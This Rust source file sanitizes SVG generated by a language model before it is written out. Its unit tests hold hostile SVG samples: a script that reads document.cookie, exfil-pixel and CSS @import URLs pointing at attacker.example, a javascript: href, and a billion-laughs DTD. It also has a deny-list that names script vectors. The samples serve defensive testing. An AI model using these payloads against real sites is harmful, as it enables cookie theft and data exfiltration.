//! The SVG pipeline: generate → **validate** → **sanitize** → **optimize**,
//! with a bounded repair loop (L-V2). LLM-generated
//! SVG is code generation and gets code discipline: it is mechanically
//! validated and rendered inert before it is ever written — never trusted
//! because it "looked right".
//!
//! Pure text in, pure text out — no rasterization, no network, no
//! filesystem — so the whole pipeline is unit-testable against a hostile SVG
//! corpus. (`resvg` rasterization for terminal preview, per spec §4 step 5,
//! is a caller concern; this crate's preview ladder takes ready image bytes.)
//!
//! # Validation
//! Parsed with `roxmltree` under its default options, which **reject DTDs**
//! (`<!DOCTYPE …>` / internal entities). That is a deliberate security guard:
//! it blocks XXE and billion-laughs entity-expansion vectors before they can
//! reach a downstream renderer. A parse failure yields
//! [`SvgError::Parse`] with the line/col of the offending token, which the
//! repair loop feeds back to the model.
//!
//! # Sanitization rules (each documented, all tested)
//! Because roxmltree is read-only, sanitization is a *re-serialization* pass:
//! the validated tree is walked and a **deny-list** of dangerous nodes and
//! attributes is elided — the elements in [`is_dropped_element`], event-handler
//! attributes, and external/script URL references are dropped; every other
//! node/attribute is re-emitted verbatim (with text escaped). The rules:
//!
//! 1. **Drop `<script>`** (and subtree) — SVG script elements execute in a
//!    rendering context; artifacts must be inert.
//! 2. **Drop `<style>`** (and subtree) — CSS `@import`/`url(…)` inside a
//!    `<style>` block fetches off-host resources when the artifact is inlined
//!    into an HTML context, the same remote-exfil vector as rule 5.
//! 3. **Drop `<foreignObject>`** (and subtree) — it embeds arbitrary
//!    (X)HTML, i.e. an escape hatch out of the SVG deny-list.
//! 4. **Drop event-handler attributes** — any attribute whose name starts
//!    with `on` (`onload`, `onclick`, …) is script.
//! 5. **Drop external `href` / `xlink:href`** — only same-document fragment
//!    references (`#id`) survive; `http(s):`, `data:`, `javascript:`,
//!    protocol-relative, and every other target is stripped. This neutralizes
//!    remote `<image>` exfil pixels and `javascript:` navigation.
//! 6. **Drop attribute values that reference external resources** via a URL
//!    scheme (`…://…`), a protocol-relative prefix (`//host/…`, including inside
//!    `url(//…)`), or `javascript:` anywhere in the value — covers
//!    `fill="url(http://…)"`, external paint servers, filters, and masks.
//!
//! # Optimization (light, step 4)
//! Comments and processing instructions are dropped; `<metadata>` elements
//! are dropped; insignificant whitespace in text is collapsed. A `viewBox` is
//! backfilled on the root from `width`/`height` when absent (spec §4 "enforce
//! a viewBox"), which keeps the artifact safely scalable when inlined.

use async_trait::async_trait;
use roxmltree::{Document, Node};
use thiserror::Error;

/// The SVG namespace URI — SVG elements resolve to this; re-declared on the
/// sanitized root.
const SVG_NS: &str = "http://www.w3.org/2000/svg";
/// The XLink namespace URI — carries `xlink:href`; re-declared on the root
/// only when the tree actually uses it.
const XLINK_NS: &str = "http://www.w3.org/1999/xlink";

/// Recommended attempt budget for [`SvgPipeline::generate`]: one initial
/// generation plus two repair rounds ( step 2, "max 2
/// repair rounds").
pub const DEFAULT_SVG_ATTEMPTS: u32 = 3;

/// A named SVG failure. `Parse` carries the line/col of the offending token
/// (L-V2: mechanical validation, precise feedback).
#[derive(Error, Debug, Clone, PartialEq, Eq)]
pub enum SvgError {
    /// The text did not parse as XML/SVG (includes a rejected DTD).
    #[error("SVG parse error at {line}:{col}: {message}")]
    Parse {
        line: u32,
        col: u32,
        message: String,
    },
    /// The document's root element is not `<svg>`.
    #[error("SVG root element is not <svg>")]
    NoSvgRoot,
    /// The repair loop ran out of attempts without producing valid SVG.
    #[error("SVG repair exhausted after {attempts} attempt(s); last error: {last}")]
    RepairExhausted { attempts: u32, last: String },
    /// The element tree is nested deeper than [`MAX_NESTING_DEPTH`]. Rejected
    /// before sanitization because the recursive serializer would otherwise
    /// overflow the stack and abort the process on hostile model output.
    #[error("SVG nested too deeply (> {MAX_NESTING_DEPTH} levels)")]
    TooDeeplyNested,
}

/// Maximum element nesting depth accepted. Real SVG art is a few dozen levels
/// at most; anything past this is either broken or an attempt to overflow the
/// recursive serializer. Kept well below the stack budget of a worker thread.
pub const MAX_NESTING_DEPTH: usize = 256;

/// A cheap, allocation-free upper bound on element nesting read straight from
/// the raw text — used to reject a hostile document BEFORE it is parsed.
/// Both the parser and the recursive serializer descend per nesting level, so
/// a deep-enough tree overflows the stack; this textual scan runs first so
/// neither is ever reached with an over-deep document.
///
/// It tracks depth on element open/close transitions: `<tag>` increments,
/// `</tag>` and a self-closing `/>` decrement, and comment/CDATA/PI/decl
/// openers (`<!`, `<?`) don't count. In well-formed XML a raw `<` only ever
/// starts markup (`<` in text/attribute values must be escaped), so this is a
/// sound bound; malformed input is rejected at parse anyway.
fn raw_element_depth_exceeds(text: &str, max: usize) -> bool {
    let b = text.as_bytes();
    let mut depth = 0usize;
    let mut i = 0;
    while i < b.len() {
        match b[i] {
            b'<' => match b.get(i + 1) {
                Some(b'/') => depth = depth.saturating_sub(1),
                Some(b'!') | Some(b'?') => {}
                _ => {
                    depth += 1;
                    if depth > max {
                        return true;
                    }
                }
            },
            b'/' if b.get(i + 1) == Some(&b'>') => depth = depth.saturating_sub(1),
            _ => {}
        }
        i += 1;
    }
    false
}

/// The result of processing: the sanitized, optimized SVG text and a
/// human-readable list of what sanitization removed (for reporting to the
/// user — "stripped 1 <script>, 1 external @href").
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct ProcessedSvg {
    pub svg: String,
    pub removed: Vec<String>,
}

/// A model-backed SVG generator, injected by CLI glue (this crate must not
/// depend on `stella-model`). `prior_error` carries the previous attempt's
/// parse/validation failure so the model can repair it (
/// §4 step 2).
#[async_trait]
pub trait SvgGenerator: Send + Sync {
    async fn generate(&self, prompt: &str, prior_error: Option<&str>) -> String;
}

/// The stateless SVG pipeline.
pub struct SvgPipeline;

impl SvgPipeline {
    /// Validate → sanitize → optimize a single SVG string. Pure and
    /// deterministic; the core of L-V2. Never emits an artifact that did not
    /// parse.
    pub fn process(svg_text: &str) -> Result<ProcessedSvg, SvgError> {
        // Reject a pathologically deep document BEFORE parsing: both roxmltree's
        // parser and the recursive serializer descend per nesting level, so an
        // over-deep tree would overflow the stack and abort the process.
        if raw_element_depth_exceeds(svg_text, MAX_NESTING_DEPTH) {
            return Err(SvgError::TooDeeplyNested);
        }
        let doc = Document::parse(svg_text).map_err(|e| {
            let pos = e.pos();
            SvgError::Parse {
                line: pos.row,
                col: pos.col,
                message: e.to_string(),
            }
        })?;
        let root = doc.root_element();
        if !root.tag_name().name().eq_ignore_ascii_case("svg") {
            return Err(SvgError::NoSvgRoot);
        }
        let mut removed = Vec::new();
        let svg = serialize_element(root, &mut removed, true);
        Ok(ProcessedSvg { svg, removed })
    }

    /// Generate SVG through `generator` with a bounded repair loop: up to
    /// `max_attempts` tries, feeding each parse/validation error back into
    /// the next generation, then failing with the last error
    /// ( step 2; property: the loop always terminates).
    /// `max_attempts` is clamped to at least 1.
    pub async fn generate(
        generator: &dyn SvgGenerator,
        prompt: &str,
        max_attempts: u32,
    ) -> Result<ProcessedSvg, SvgError> {
        let attempts = max_attempts.max(1);
        let mut prior_error: Option<String> = None;
        let mut last = "no attempt made".to_string();
        for _ in 0..attempts {
            let candidate = generator.generate(prompt, prior_error.as_deref()).await;
            match Self::process(&candidate) {
                Ok(processed) => return Ok(processed),
                Err(err) => {
                    last = err.to_string();
                    prior_error = Some(last.clone());
                }
            }
        }
        Err(SvgError::RepairExhausted { attempts, last })
    }
}

// ── serialization (whitelist walk) ──────────────────────────────────────

/// Elements dropped entirely, subtree and all. Case-insensitive so a
/// `<SCRIPT>` variant can't slip through. `<style>` is dropped because its CSS
/// can pull off-host resources via `@import`/`url(…)` — the same exfil vector
/// [`references_external`] blocks in attribute values.
fn is_dropped_element(local: &str) -> bool {
    local.eq_ignore_ascii_case("script")
        || local.eq_ignore_ascii_case("style")
        || local.eq_ignore_ascii_case("foreignObject")
        || local.eq_ignore_ascii_case("metadata")
}

/// Decide whether an attribute (by lowercased emit-name and value) survives.
fn keep_attribute(name_low: &str, value: &str) -> bool {
    // Rule 3: event handlers.
    if name_low.starts_with("on") {
        return false;
    }
    // Rule 4: only same-document fragment hrefs survive.
    if name_low == "href" || name_low == "xlink:href" {
        return value.trim_start().starts_with('#');
    }
    // Rule 5: any external/script URL reference in a value.
    if references_external(value) {
        return false;
    }
    true
}

/// Whether a value references an external resource: any absolute URL scheme
/// (`…://…`), a protocol-relative URL (`//host/…`, including inside `url(//…)`),
/// or a `javascript:` pseudo-scheme — case-insensitive. `://` is a subset of
/// `//`, so the single `//` check covers both absolute and protocol-relative
/// forms.
fn references_external(value: &str) -> bool {
    let low = value.to_ascii_lowercase();
    low.contains("//") || low.contains("javascript:")
}

/// Does the subtree use any XLink-namespaced attribute? Governs whether the
/// root re-declares `xmlns:xlink` (declaring an undeclared prefix would make
/// the output malformed).
fn contains_xlink(node: Node) -> bool {
    if node.attributes().any(|a| a.namespace() == Some(XLINK_NS)) {
        return true;
    }
    node.children().any(|c| c.is_element() && contains_xlink(c))
}

/// Serialize one element (assumed already checked as not-dropped) and its
/// surviving descendants into sanitized SVG text.
fn serialize_element(node: Node, removed: &mut Vec<String>, is_root: bool) -> String {
    let local = node.tag_name().name();
    let mut out = String::new();
    out.push('<');
    out.push_str(local);

    if is_root {
        out.push_str(" xmlns=\"");
        out.push_str(SVG_NS);
        out.push('"');
        if contains_xlink(node) {
            out.push_str(" xmlns:xlink=\"");
            out.push_str(XLINK_NS);
            out.push('"');
        }
    }

    let mut has_viewbox = false;
    let mut width = None;
    let mut height = None;
    for attr in node.attributes() {
        let is_xlink = attr.namespace() == Some(XLINK_NS);
        let emit_name = if is_xlink {
            format!("xlink:{}", attr.name())
        } else {
            attr.name().to_string()
        };
        let name_low = emit_name.to_ascii_lowercase();

        if is_root {
            match name_low.as_str() {
                "viewbox" => has_viewbox = true,
                "width" => width = parse_length(attr.value()),
                "height" => height = parse_length(attr.value()),
                _ => {}
            }
        }

        if !keep_attribute(&name_low, attr.value()) {
            removed.push(format!("@{emit_name} on <{local}>"));
            continue;
        }
        out.push(' ');
        out.push_str(&emit_name);
        out.push_str("=\"");
        out.push_str(&escape_attr(attr.value()));
        out.push('"');
    }

    // Backfill a viewBox on the root from width/height when absent.
    if is_root
        && !has_viewbox
        && let (Some(w), Some(h)) = (width, height)
    {
        out.push_str(&format!(" viewBox=\"0 0 {} {}\"", fmt_num(w), fmt_num(h)));
    }

    let mut inner = String::new();
    for child in node.children() {
        if child.is_comment() || child.is_pi() {
            continue; // optimize: drop comments/PIs
        }
        if child.is_text() {
            if let Some(text) = child.text() {
                let collapsed = collapse_whitespace(text);
                if !collapsed.is_empty() {
                    inner.push_str(&escape_text(&collapsed));
                }
            }
            continue;
        }
        if child.is_element() {
            let child_local = child.tag_name().name();
            if is_dropped_element(child_local) {
                removed.push(format!("<{child_local}> element"));
                continue;
            }
            inner.push_str(&serialize_element(child, removed, false));
        }
    }

    if inner.is_empty() {
        out.push_str("/>");
    } else {
        out.push('>');
        out.push_str(&inner);
        out.push_str("</");
        out.push_str(local);
        out.push('>');
    }
    out
}

/// Parse a positive numeric length, tolerating a `px` unit; anything with a
/// non-px unit or non-positive value yields `None` (no viewBox backfill).
fn parse_length(raw: &str) -> Option<f64> {
    let trimmed = raw.trim().trim_end_matches("px").trim();
    let value: f64 = trimmed.parse().ok()?;
    if value.is_finite() && value > 0.0 {
        Some(value)
    } else {
        None
    }
}

/// Render a number without a trailing `.0` for whole values.
fn fmt_num(value: f64) -> String {
    if (value.fract()).abs() < 1e-9 {
        format!("{}", value as i64)
    } else {
        format!("{value}")
    }
}

/// Collapse runs of whitespace to a single space and trim the ends.
fn collapse_whitespace(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    let mut prev_ws = false;
    for ch in text.chars() {
        if ch.is_whitespace() {
            if !prev_ws {
                out.push(' ');
                prev_ws = true;
            }
        } else {
            out.push(ch);
            prev_ws = false;
        }
    }
    out.trim().to_string()
}

fn escape_text(text: &str) -> String {
    text.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
}

fn escape_attr(text: &str) -> String {
    escape_text(text).replace('"', "&quot;")
}

#[cfg(test)]
mod tests {
    use super::*;

    fn process(text: &str) -> ProcessedSvg {
        SvgPipeline::process(text).expect("should process")
    }

    #[test]
    fn valid_svg_round_trips_and_keeps_geometry() {
        let out = process(
            r##"<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><rect x="1" y="1" width="8" height="8" fill="#f60"/></svg>"##,
        );
        assert!(out.svg.contains("<rect"));
        assert!(out.svg.contains("fill=\"#f60\""));
        assert!(out.svg.contains("viewBox=\"0 0 10 10\""));
        assert!(out.removed.is_empty());
    }

    #[test]
    fn script_element_is_stripped_injection_case() {
        let out = process(
            r#"<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.cookie)</script><rect/></svg>"#,
        );
        assert!(!out.svg.contains("script"), "{}", out.svg);
        assert!(!out.svg.contains("alert"), "{}", out.svg);
        assert!(out.svg.contains("<rect"));
        assert!(out.removed.iter().any(|r| r.contains("script")));
    }

    #[test]
    fn event_handler_attributes_are_stripped() {
        let out = process(
            r#"<svg xmlns="http://www.w3.org/2000/svg"><rect onload="steal()" onclick="x()" width="1" height="1"/></svg>"#,
        );
        assert!(!out.svg.contains("onload"), "{}", out.svg);
        assert!(!out.svg.contains("onclick"), "{}", out.svg);
        assert!(!out.svg.contains("steal"), "{}", out.svg);
        assert!(out.svg.contains("width=\"1\""));
    }

    #[test]
    fn external_image_href_exfil_is_stripped() {
        // OWASP-style exfil: an <image> pulling a tracking pixel off-host.
        let out = process(
            r#"<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="http://attacker.example/collect?c=secret" x="0" y="0"/></svg>"#,
        );
        assert!(!out.svg.contains("attacker.example"), "{}", out.svg);
        assert!(!out.svg.contains("secret"), "{}", out.svg);
        // the <image> element survives but references nothing external
        assert!(out.svg.contains("<image"));
        assert!(out.removed.iter().any(|r| r.contains("href")));
    }

    #[test]
    fn javascript_href_is_stripped_but_fragment_href_survives() {
        let out = process(
            r##"<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:href="javascript:alert(1)"><rect/></a><use href="#icon"/></svg>"##,
        );
        assert!(!out.svg.contains("javascript"), "{}", out.svg);
        assert!(out.svg.contains("href=\"#icon\""), "{}", out.svg);
    }

    #[test]
    fn style_element_with_remote_css_is_stripped() {
        // CSS @import / url() inside <style> fetches off-host when the artifact
        // is inlined into HTML — the same exfil class as an external href.
        let out = process(
            r#"<svg xmlns="http://www.w3.org/2000/svg"><style>@import url("http://attacker.example/x.css");</style><rect/></svg>"#,
        );
        assert!(!out.svg.contains("style"), "{}", out.svg);
        assert!(!out.svg.contains("attacker.example"), "{}", out.svg);
        assert!(!out.svg.contains("@import"), "{}", out.svg);
        assert!(out.svg.contains("<rect"));
        assert!(out.removed.iter().any(|r| r.contains("style")));
    }

    #[test]
    fn protocol_relative_url_reference_is_stripped() {
        // `//host/…` (protocol-relative) is external too — it inherits the
        // page's scheme when inlined, so a paint-server pointing at it exfils.
        let out = process(
            r##"<svg xmlns="http://www.w3.org/2000/svg"><rect fill="url(//attacker.example/x)" stroke="#000"/></svg>"##,
        );
        assert!(!out.svg.contains("attacker.example"), "{}", out.svg);
        assert!(out.svg.contains("stroke=\"#000\""), "{}", out.svg);
        assert!(out.removed.iter().any(|r| r.contains("fill")));
    }

    #[test]
    fn external_url_in_paint_value_is_stripped() {
        let out = process(
            r##"<svg xmlns="http://www.w3.org/2000/svg"><rect fill="url(http://attacker.example/x)" stroke="#000"/></svg>"##,
        );
        assert!(!out.svg.contains("attacker.example"), "{}", out.svg);
        assert!(out.svg.contains("stroke=\"#000\""));
    }

    #[test]
    fn foreign_object_and_metadata_and_comments_are_dropped() {
        let out = process(
            r#"<svg xmlns="http://www.w3.org/2000/svg"><metadata>junk</metadata><!-- a comment --><foreignObject><body xmlns="http://www.w3.org/1999/xhtml">hi</body></foreignObject><rect/></svg>"#,
        );
        assert!(!out.svg.contains("foreignObject"), "{}", out.svg);
        assert!(!out.svg.contains("metadata"), "{}", out.svg);
        assert!(!out.svg.contains("comment"), "{}", out.svg);
        assert!(out.svg.contains("<rect"));
    }

    #[test]
    fn dtd_is_rejected_as_a_parse_error_billion_laughs_guard() {
        let hostile = r#"<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY lol "ha"><!ENTITY lol2 "&lol;&lol;">]><svg xmlns="http://www.w3.org/2000/svg"/>"#;
        let err = SvgPipeline::process(hostile).unwrap_err();
        assert!(matches!(err, SvgError::Parse { .. }), "{err:?}");
    }

    #[test]
    fn malformed_svg_reports_line_and_col() {
        let err = SvgPipeline::process("<svg><rect></svg>").unwrap_err();
        match err {
            SvgError::Parse { line, col, .. } => {
                assert!(line >= 1);
                assert!(col >= 1);
            }
            other => panic!("expected Parse, got {other:?}"),
        }
    }

    #[test]
    fn non_svg_root_is_rejected() {
        let err =
            SvgPipeline::process(r#"<html xmlns="http://www.w3.org/2000/svg"/>"#).unwrap_err();
        assert_eq!(err, SvgError::NoSvgRoot);
    }

    #[test]
    fn viewbox_is_backfilled_from_width_and_height() {
        let out = process(
            r#"<svg xmlns="http://www.w3.org/2000/svg" width="200" height="100"><rect/></svg>"#,
        );
        assert!(out.svg.contains("viewBox=\"0 0 200 100\""), "{}", out.svg);
    }

    #[test]
    fn sanitizer_is_idempotent() {
        let hostile = r##"<svg xmlns="http://www.w3.org/2000/svg" width="4" height="4"><script>x()</script><rect onload="y()" fill="url(https://evil/x)" stroke="#111"/><!-- c --></svg>"##;
        let once = process(hostile);
        let twice = process(&once.svg);
        assert_eq!(once.svg, twice.svg, "second pass must be a fixed point");
        assert!(
            twice.removed.is_empty(),
            "nothing left to strip: {:?}",
            twice.removed
        );
    }

    #[test]
    fn whitespace_in_text_is_collapsed() {
        let out = process(
            "<svg xmlns=\"http://www.w3.org/2000/svg\"><text>hello    \n   world</text></svg>",
        );
        assert!(out.svg.contains(">hello world<"), "{}", out.svg);
    }

    // ── repair loop ──────────────────────────────────────────────────────

    struct ScriptedGenerator {
        outputs: std::sync::Mutex<Vec<String>>,
        saw_prior_error: std::sync::atomic::AtomicBool,
    }

    #[async_trait]
    impl SvgGenerator for ScriptedGenerator {
        async fn generate(&self, _prompt: &str, prior_error: Option<&str>) -> String {
            if prior_error.is_some() {
                self.saw_prior_error
                    .store(true, std::sync::atomic::Ordering::SeqCst);
            }
            let mut outputs = self.outputs.lock().expect("lock");
            if outputs.is_empty() {
                "<svg/>".to_string()
            } else {
                outputs.remove(0)
            }
        }
    }

    #[tokio::test]
    async fn repair_loop_recovers_on_a_later_attempt_and_feeds_back_the_error() {
        let generator = ScriptedGenerator {
            outputs: std::sync::Mutex::new(vec![
                "<svg><rect></svg>".to_string(), // malformed
                r#"<svg xmlns="http://www.w3.org/2000/svg"><rect/></svg>"#.to_string(),
            ]),
            saw_prior_error: std::sync::atomic::AtomicBool::new(false),
        };
        let out = SvgPipeline::generate(&generator, "a box", 3).await.unwrap();
        assert!(out.svg.contains("<rect"));
        assert!(
            generator
                .saw_prior_error
                .load(std::sync::atomic::Ordering::SeqCst),
            "the second attempt must receive the first attempt's error"
        );
    }

    #[tokio::test]
    async fn repair_loop_terminates_and_reports_last_error_when_exhausted() {
        let generator = ScriptedGenerator {
            outputs: std::sync::Mutex::new(vec![
                "<svg><a></svg>".to_string(),
                "<svg><b></svg>".to_string(),
            ]),
            saw_prior_error: std::sync::atomic::AtomicBool::new(false),
        };
        let err = SvgPipeline::generate(&generator, "x", 2).await.unwrap_err();
        match err {
            SvgError::RepairExhausted { attempts, last } => {
                assert_eq!(attempts, 2);
                assert!(!last.is_empty());
            }
            other => panic!("expected RepairExhausted, got {other:?}"),
        }
    }

    #[tokio::test]
    async fn generate_clamps_attempts_to_at_least_one() {
        let generator = ScriptedGenerator {
            outputs: std::sync::Mutex::new(vec!["<svg><bad></svg>".to_string()]),
            saw_prior_error: std::sync::atomic::AtomicBool::new(false),
        };
        // max_attempts = 0 must still make exactly one attempt.
        let err = SvgPipeline::generate(&generator, "x", 0).await.unwrap_err();
        assert!(matches!(err, SvgError::RepairExhausted { attempts: 1, .. }));
    }

    #[test]
    fn a_pathologically_deep_svg_is_rejected_not_a_stack_overflow() {
        // roxmltree parses into a flat arena (no overflow parsing), but the
        // recursive serializer would blow the stack — so `process` must reject
        // an over-deep tree with a typed error instead of aborting the process.
        let depth = MAX_NESTING_DEPTH + 500;
        let mut svg = String::from("<svg xmlns=\"http://www.w3.org/2000/svg\">");
        svg.push_str(&"<g>".repeat(depth));
        svg.push_str(&"</g>".repeat(depth));
        svg.push_str("</svg>");

        let err = SvgPipeline::process(&svg).expect_err("deep tree must be rejected");
        assert!(
            matches!(err, SvgError::TooDeeplyNested),
            "expected TooDeeplyNested, got {err:?}"
        );

        // A shallow tree still processes normally.
        let ok =
            SvgPipeline::process("<svg xmlns=\"http://www.w3.org/2000/svg\"><g><rect/></g></svg>");
        assert!(ok.is_ok(), "a normal SVG must still process: {ok:?}");
    }
}
